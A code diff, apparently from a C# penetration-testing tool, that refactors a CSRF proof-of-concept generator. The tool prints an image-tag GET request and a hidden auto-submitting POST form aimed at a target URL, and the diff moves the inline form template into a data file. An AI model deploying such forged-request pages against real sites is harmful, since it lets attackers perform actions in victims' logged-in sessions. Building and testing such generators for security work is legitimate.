@@ -20,7 +20,8 @@ namespace CShidori.Core
             if(method.ToLower() == "get")
             {
                 getcsrf();
-            }else if ( method.ToLower() == "post")
+            }
+            else if ( method.ToLower() == "post")
             {
                 postcsrf();
             }
@@ -35,11 +36,11 @@ namespace CShidori.Core
             string csrf = @"
 <html>
     <body>
-        <img src=""§TARGET§"">
+        <img src=""§"">
     </body>
 </html>
 ";
-            Console.WriteLine(csrf.Replace("§TARGET§", this.target + "?" + this.parameters));
+            Console.WriteLine(csrf.Replace("§", this.target + "?" + this.parameters));
         }
 
 
@@ -48,13 +49,9 @@ namespace CShidori.Core
         private void postcsrf()
         {
             Dictionary<string, string> dparameters = new Dictionary<string, string>();
-            string csrf = @"
- <iframe style=""display: none"" name=""csrf-frame""></iframe>
- <form method=""POST"" action=""§TARGET§"" target=""csrf-frame"" id=""csrf-form"">
- §PARAMETERS§    <input type=""submit"" value=""submit"">
- </form>
- <script>document.getElementById(""csrf-form"").submit()</script>
-";
+
+            string csrf = System.IO.File.ReadAllText(@"Data/CsrfTemplate.txt");
+
             string FormParams = @"     <input type=""hidden"" name=""§NAME§"" value=""§VAMUE§"">
 ";
             string formPrep = string.Empty;
@@ -62,9 +59,7 @@ namespace CShidori.Core
             if (this.parameters.Contains("&"))
             {
                 foreach (string pv in this.parameters.Split("&"))
-                {
                     dparameters.Add(pv.Split("=")[0], pv.Split("=")[1]);
-                }
             }
             else
             {
